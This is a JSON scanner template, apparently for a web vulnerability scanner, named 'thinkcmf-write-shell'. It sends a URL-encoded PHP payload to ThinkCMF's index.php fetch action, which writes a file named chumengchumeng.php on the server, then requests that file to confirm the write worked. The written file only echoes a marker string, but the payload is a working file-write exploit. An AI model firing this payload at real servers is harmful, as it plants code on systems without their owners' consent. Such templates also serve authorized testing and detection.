{
    "Name": "thinkcmf-write-shell",
    "Description": "thinkcmf-write-shell",
    "Product": "thinkadmin",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/index.php?a=fetch&content=%3C?php+file_put_contents(%22chumengchumeng.php%22,%22%3C?php+echo+chumengchumeng%3B%22)%3B",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "true"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":"AND"
                },
                {
                    "Method": "GET",
                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
                    "Uri":"/chumengchumeng.php",
                    "Port":"",
                    "Data":"",
                    "Follow_redirects":"false",
                    "Upload":{"Name": "","fileName": "","filePath": "" },
                    "Response":{
                    "Check_Steps":"AND",
                    "Checks": [
                            {
                            "Operation": "contains", 
                            "Key":"",
                            "Value": "chumengchumeng"
                            },
                             {
                            "Operation": "code", 
                            "Key":"",
                            "Value": "200"  
                             }
                    ]
                    },
                    "Next_decide":""
                            }
]}

